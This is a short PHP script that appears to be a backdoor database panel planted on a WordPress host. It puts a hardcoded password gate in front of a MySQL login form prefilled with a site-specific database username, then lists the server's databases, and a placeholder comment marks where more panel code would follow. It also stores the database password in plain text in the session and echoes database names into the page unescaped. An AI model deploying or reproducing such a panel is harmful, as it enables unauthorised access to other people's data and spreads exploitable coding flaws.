<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

$panel_password = "wiredmouseis";   

// Panel Password
if (!isset($_SESSION['panel_auth'])) {
    if (isset($_POST['ppass']) && $_POST['ppass'] === $panel_password) {
        $_SESSION['panel_auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    die('
    <!DOCTYPE html><html><head><title>Access</title>
    <style>body{background:#f8f9fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial;}
    .box{background:white;padding:40px;border-radius:10px;box-shadow:0 5px 20px rgba(0,0,0,0.1);width:360px;text-align:center;}
    input{width:100%;padding:15px;margin:10px 0;border:1px solid #888;border-radius:5px;}
    button{width:100%;padding:14px;background:#0066ff;color:white;border:none;border-radius:5px;}</style>
    </head><body>
    <div class="box">
        <h2>Panel Access</h2>
        <form method="post">
            <input type="password" name="ppass" placeholder="Enter Panel Password" autofocus>
            <button type="submit">Login</button>
        </form>
    </div>
    </body></html>');
}

// Database Login
if (!isset($_SESSION['db_connected'])) {
    if (isset($_POST['host'], $_POST['user'], $_POST['dbpass'])) {
        $conn = @mysqli_connect($_POST['host'], $_POST['user'], $_POST['dbpass']);
        if ($conn) {
            $_SESSION['db_connected'] = true;
            $_SESSION['host'] = $_POST['host'];
            $_SESSION['user'] = $_POST['user'];
            $_SESSION['pass'] = $_POST['dbpass'];
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "❌ Access Denied!<br>Wrong Username or Password.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html><head><title>DB Login</title>
    <style>
        body{background:#0a0a0a;color:#ddd;font-family:Consolas;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .box{background:#111;padding:40px;border-radius:10px;width:420px;border:1px solid #0f0;}
        input{width:100%;padding:12px;margin:8px 0;background:#222;color:#0f0;border:1px solid #0f0;border-radius:5px;}
        button{width:100%;padding:14px;background:#0066ff;color:white;border:none;border-radius:5px;cursor:pointer;}
    </style>
    </head><body>
    <div class="box">
        <h2>MySQL Database Login</h2>
        <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
        <form method="post">
            <input type="text" name="host" value="localhost" placeholder="Host"><br>
            <input type="text" name="user" value="sharkne1_wp240" placeholder="Username"><br>
            <input type="password" name="dbpass" placeholder="Database Password" autofocus><br>
            <button type="submit">Connect</button>
        </form>
        <br><a href="?logout=1" style="color:red;">← Back</a>
    </div>
    </body></html>
    <?php
    exit;
}

// Rest of the code (Main Panel) ...
$conn = mysqli_connect($_SESSION['host'], $_SESSION['user'], $_SESSION['pass']);
if (!$conn) {
    echo "<h2 style='color:red'>Connection Failed. Please Login Again.</h2>";
    session_destroy();
    exit;
}

echo "<h3>✅ Connected Successfully!</h3>";
echo "<p>Current User: <b>".$_SESSION['user']."</b></p>";

// Show Databases
$res = mysqli_query($conn, "SHOW DATABASES");
echo "<h3>Databases:</h3><table border='1' cellpadding='8'>";
while($row = mysqli_fetch_row($res)){
    if(in_array($row[0], ['information_schema','performance_schema','mysql','sys'])) continue;
    echo "<tr><td><a href='?db=".$row[0]."'>".$row[0]."</a></td></tr>";
}
echo "</table>";

if(isset($_GET['logout'])){
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
}
?>
